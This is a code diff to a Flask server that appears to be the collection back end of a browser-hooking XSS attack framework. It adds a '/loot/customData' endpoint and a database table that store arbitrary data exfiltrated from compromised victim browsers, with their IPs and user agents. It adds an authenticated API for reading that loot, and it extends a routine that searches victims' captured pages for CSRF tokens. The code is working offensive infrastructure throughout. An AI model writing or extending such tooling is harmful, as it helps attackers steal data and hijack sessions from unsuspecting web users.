@@ -449,6 +449,7 @@ class FetchCall(Base):
         return f'<FetchCall {self.id}>'
 
 
+
 class FormPost(Base):
     __tablename__ = 'formpost'
 
@@ -463,6 +464,21 @@ class FormPost(Base):
 
     def __repr__(self):
         return f'<FormPost {self.id}>'
+
+
+
+class CustomExfil(Base):
+    __tablename__ = 'customexfil'
+
+    id        = Column(Integer, primary_key=True)
+    note      = Column(Text, nullable=True)
+    data      = Column(Text, nullable=True)
+    timeStamp = Column(DateTime(timezone=True), server_default=func.now())
+
+    def __repr__(self):
+        return f'<CustomExfil {self.id}>'
+
+
 
 
 class Event(Base):
@@ -503,6 +519,7 @@ class CustomPayload(Base):
     def __repr__(self):
         return f'<CustomPayload {self.id}>'
 
+   
 
 
 class ClientPayloadJob(Base):   
@@ -797,6 +814,7 @@ try:
                     FetchCall.__table__.drop(engine)
                     Event.__table__.drop(engine)
                     FormPost.__table__.drop(engine)
+                    CustomExfil.__table__.drop(engine)
                     ClientPayloadJob.__table__.drop(engine)
                     dbCommit()
 
@@ -1641,6 +1659,44 @@ def recordFormPost(identifier):
 
 
 
+
+# Record custom exfiltration, allows custom payloads
+# to send responses into client events for storage
+@app.route('/loot/customData/<identifier>', methods=['POST'])
+def recordCustomExfil(identifier):
+    if not isClientSessionValid(identifier):
+        return "No.", 401
+
+    content = request.json
+
+    note = content.get('note', None)
+    data = content.get('data', None)
+
+    newExfil = CustomExfil(note=note, data=data)
+    db_session.add(newExfil)
+
+    if (proxyMode):
+        ip = request.headers.get('X-Forwarded-For')
+    else:
+        ip = request.remote_addr
+
+    clientSeen(identifier, ip, request.headers.get('User-Agent'))
+    dbCommit()
+
+    # add to global event table
+    db_session.refresh(newExfil)
+    newEvent  = Event(clientID=identifier, timeStamp=newExfil.timeStamp, 
+    eventType ='CUSTOMEXFIL', eventID=newExfil.id)
+    db_session.add(newEvent)
+    dbCommit()    
+
+    return "ok", 200
+
+
+
+
+
+
 #***************************************************************************
 # UI API Endpoints
 
@@ -1863,19 +1919,13 @@ def searchCsrfToken(key):
 
     print("!!!!!!! Searching for: " + tokenName + ":" + tokenValue)
 
-    # Get client ID from form even key
-    # get all HTML file content (and URL) for that client (html table)
-    # loop through all files looking for token
-
-    # return URL
-    # return JavaScript code to find token?
-
     formPost = FormPost.query.filter_by(id=key).first()
 
     clientID = formPost.clientID
 
     htmlLoot = HtmlCode.query.filter_by(clientID=clientID)
 
+    foundToken = False
     for htmlCode in htmlLoot:
         print("Going to search file: " + htmlCode.fileName)
         with open(htmlCode.fileName, 'r', encoding='utf-8') as file:
@@ -1883,16 +1933,34 @@ def searchCsrfToken(key):
 
             if (tokenValue in content):
                 if (tokenName in content):
+                    foundToken = True
                     print("Found to token in: " + htmlCode.fileName)
                     print("URL is: " + htmlCode.url)
 
                     break
 
+    if foundToken:
+        tokenFileData = {'url':escape(htmlCode.url), 'fileName':escape(htmlCode.fileName)}
+    else:
+        tokenFileData = {'url':'Not Found', 'fileName':'Not Found'}
+
+    return jsonify(tokenFileData)
 
 
 
 
-    return "ok", 200
+@app.route('/api/clientCustomExfil/<key>', methods=['GET'])
+@login_required
+def getClientCustomExfil(key):
+    customExfil = CustomExfil.query.filter_by(id=key).first()
+
+    # Note these are base64 encoded at this point, they'll need
+    # to be escaped client side
+    customExfilData = {'note':customExfil.note, 'data':customExfil.data}
+
+    return jsonify(customExfilData)
+
+
 
 
 
